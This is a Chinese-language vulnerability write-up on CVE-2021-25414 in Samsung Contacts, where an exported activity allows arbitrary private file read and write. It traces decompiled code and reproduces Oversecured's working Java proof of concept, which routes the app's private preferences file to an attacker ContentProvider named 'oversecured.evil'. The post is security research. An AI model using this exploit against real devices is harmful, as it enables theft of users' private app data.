---
layout: post
title:  "[CVE-2021-25414] [Samsung] [Contacts] SetProfilePhotoActivity导出存在任意私有文件读写漏洞"
date:   2022-11-25 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.25 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述



## 0x01 触发条件

| 上线日期 |  应用名  |               包名               |   版本号   |               MD5                | 下载链接 |
| :------: | :------: | :------------------------------: | :--------: | :------------------------------: | :------: |
|          | Contacts | com.samsung.android.app.contacts | 12.1.10.30 | 60579c925977ca29b889d32085a0c350 |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.samsung.android.contacts.editor.SetProfilePhotoActivity`导出

```xml
<activity 
        android:configChanges="keyboardHidden|orientation|screenSize" 
        android:hardwareAccelerated="false" 
        android:icon="@mipmap/ic_launcher_contacts" 
        android:label="@string/share_my_profile" 
        android:name="com.samsung.android.contacts.editor.SetProfilePhotoActivity" 
        android:taskAffinity="" 
        android:theme="@style/BackgroundOnlyTheme">
    <intent-filter>
        <action android:name="android.intent.action.SEND"/>
        <data android:mimeType="image/*"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.contacts.action.SET_AS_PROFILE_PICTURE"/>
        <data android:mimeType="image/*"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

前面的分析和漏洞《[CVE-2021-25413] [Samsung] [Contacts] SetProfilePhotoActivity导出存在任意私有组件启动漏洞可获取ContentProvider数据》一样

- https://wnagzihxa1n.gitbook.io/happy-android-security/application_security/cve202125413samsungcontactscomsamsungandroidappcontacts1211030setprofilephotoactivity-dao-chu-cun-za

在调用异步任务的时候，方法`doInBackground()`事实上被我们构造数据退出去了

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
@Override  // android.os.AsyncTask
protected Object doInBackground(Object[] arr_object) {
    return this.a(((Void[])arr_object));  // [1]
}
```

方法`a()`调用`savePhotoFromUriToUri()`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
protected Void a(Void[] arr_void) {
    SetProfilePhotoActivity setProfilePhotoActivity_ = (SetProfilePhotoActivity)this.setProfilePhotoActivity0.get();
    if(setProfilePhotoActivity_ == null) {
        return null;
    }

    this.savePhotoFromUriToUri(setProfilePhotoActivity_);  // [1]
    return null;
}
```

跟另外一个漏洞不一样的是，本次走的是`[6]`调用方法`S()`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
private void savePhotoFromUriToUri(SetProfilePhotoActivity setProfilePhotoActivity) {
    Uri __uri__;
    ClipData __clipData__ = setProfilePhotoActivity.getIntent().getClipData();  // [1]
    if(__clipData__ != null && __clipData__.getItemCount() == 1 && __clipData__.getItemAt(0) != null) {
        __uri__ = __clipData__.getItemAt(0).getUri();  // [2]
        if(!this.setPhotoUri(setProfilePhotoActivity, __uri__)) {  // [3]
            return;
        }
    }
    else {
        __uri__ = null;
    }

    if(__uri__ == null) {
        if(setProfilePhotoActivity.getIntent().getExtras() != null && setProfilePhotoActivity.getIntent().getExtras().getString("shared_photo_uri", null) != null) {
            __uri__ = Uri.parse(setProfilePhotoActivity.getIntent().getExtras().getString("shared_photo_uri"));  // [4]
            goto label_48;
        }

        setProfilePhotoActivity.finish();  // [5]
        return;
    }

    try {
    label_48:
        PhotoDataUtils.S(__uri__, setProfilePhotoActivity.__intent_tmp_photo_uri__, false);  // [6]
    }
    catch(SecurityException securityException0) {
        ...
    }

    ...
}
```

方法`S()`初始化了`PhotoDataUtils`实例后调用方法`T()`

```java
// com.samsung.android.contacts.editor.n.PhotoDataUtils
public static boolean S(Uri __uri__, Uri __intent_tmp_photo_uri__, boolean z) {
    PhotoDataUtils.getInstance();
    return PhotoDataUtils.mInstance.T(__uri__, __intent_tmp_photo_uri__, ((boolean)(((int)z))));  // [1]
}
```

`[1]`构造文件写出的位置，路径外部可控，`[2]`构造文件读取的位置，路径外部可控，`[3]`进行读，`[4]`进行写，读和写两个文件路径都可控，所以此处存在任意私有文件读写漏洞

```java
// com.samsung.android.contacts.editor.n.PhotoDataUtils
public boolean T(Uri __uri__, Uri __intent_tmp_photo_uri__, boolean z) {
    InputStream inputStream;
    FileOutputStream fileOutputStream;
    if(__uri__ != null && __intent_tmp_photo_uri__ != null && !this.N(__uri__)) {
        Context context = ApplicationUtil.getContext();
        try {
            fileOutputStream = context.getContentResolver().openAssetFileDescriptor(__intent_tmp_photo_uri__, "rw").createOutputStream();  // [1]
            inputStream = context.getContentResolver().openInputStream(__uri__);  // [2]
        }
        catch(IOException | NullPointerException nullPointerException) {
            goto label_77;
        }

        try {
            byte[] arr_b = new byte[0x4000];
            int v = 0;
            if(inputStream != null) {
                while(true) {
                    int readCount = inputStream.read(arr_b);  // [3]
                    if(readCount <= 0) {
                        break;
                    }

                    fileOutputStream.write(arr_b, 0, readCount);  // [4]
                    v += readCount;
                }
            }

            AppLog.l("PhotoDataUtils", "Wrote " + v + " bytes for photo " + __uri__.toString());
            goto label_57;
        }
        catch(Throwable throwable2) {
        }

        AppLog.i("PhotoDataUtils", "Failed to write photo: " + __uri__.toString() + " because: " + nullPointerException);

        if(z) {
            context.getContentResolver().delete(__uri__, null, null);
        }

        return false;
    label_97:
        if(z) {
            context.getContentResolver().delete(__uri__, null, null);
        }
        
    label_102:
        if(z) {
            context.getContentResolver().delete(__uri__, null, null);
        }

        return true;
    }

    AppLog.l("PhotoDataUtils", "can not save image " + __uri__ + " " + __intent_tmp_photo_uri__);
    return false;
}
```

完整的逻辑调用图

![逻辑调用图](/assets/resources/45CC6F657386D52434EB0BDE505C2D86.svg)

## 0x05 调试与利用

Oversecured实验室的PoC

```java
String path = new File(getApplicationInfo().dataDir, "dump").getAbsolutePath();
String theft = "/data/data/com.samsung.android.app.contacts/shared_prefs/SamsungAnalyticsPrefs.xml";

Intent i = new Intent(Intent.ACTION_SEND);
i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
i.putExtra("shared_photo_uri", "content://com.samsung.contacts.backup" + theft); // input
i.putExtra("temp_photo_uri", "content://oversecured.evil/?path=" + path); // output
i.putExtra("cropped_photo_uri", "");
i.putExtra("mimeType", "x");
startActivity(i);

new Handler().postDelayed(() -> {
    try {
        Log.d("evil", IOUtils.toString(new FileInputStream(path)));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}, 1000);
```

构造一个ContentProvider用于文件操作

```java
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    try {
        return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_WRITE_ONLY | ParcelFileDescriptor.MODE_CREATE);
    } catch (Throwable th) {
        return null;
    }
}
```

Manifest配置为导出，这样才可以被三方应用调用

```xml
<provider android:name=".MyContentProvider" android:authorities="oversecured.evil" android:exported="true" />
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 2》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/

## 附录：调试过程记录

